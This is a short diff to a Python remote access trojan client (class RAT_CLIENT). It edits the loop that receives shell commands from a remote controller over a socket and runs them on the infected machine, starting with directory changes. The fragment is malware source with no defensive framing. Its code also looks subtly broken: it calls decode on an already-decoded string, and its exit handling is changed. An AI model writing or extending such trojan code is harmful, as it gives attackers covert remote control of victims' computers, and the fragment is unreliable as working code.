@@ -92,10 +92,11 @@ class RAT_CLIENT:
             command = s.recv(1024).decode()
             
             if command == 'shell':
-                while 1:
+                a=1;
+                while a==1:
                     command = s.recv(1024).decode()
                     if command.lower() == 'exit' :
-                        break
+                        a=0;
                     if command == 'cd':
                         os.chdir(command[3:].decode('utf-8'))
                         dir = os.getcwd()
